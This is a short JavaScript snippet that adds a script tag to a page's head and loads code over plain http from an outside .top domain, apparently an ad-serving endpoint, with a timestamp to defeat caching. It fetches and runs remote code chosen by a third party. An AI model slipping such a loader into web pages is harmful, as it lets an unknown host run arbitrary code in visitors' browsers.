function loadScript(src, callback) {
		    var script = document.createElement('script'),
		        head = document.getElementsByTagName('head')[0];
		    script.type = 'text/javascript';
		    script.charset = 'UTF-8';
		    script.src = src;
		    if (script.addEventListener) {
		        script.addEventListener('load', function () {
		            callback();
		        }, false);
		    } else if (script.attachEvent) {
		        script.attachEvent('onreadystatechange', function () {
		            var target = window.event.srcElement;
		            if (target.readyState == 'loaded') {
		                callback();
		            }
		        });
		    }
		    head.appendChild(script);
		}
		loadScript('http://www.rrdtjj.top/adzone/getjs/ad'+Date.now()+'.js',function(){
		});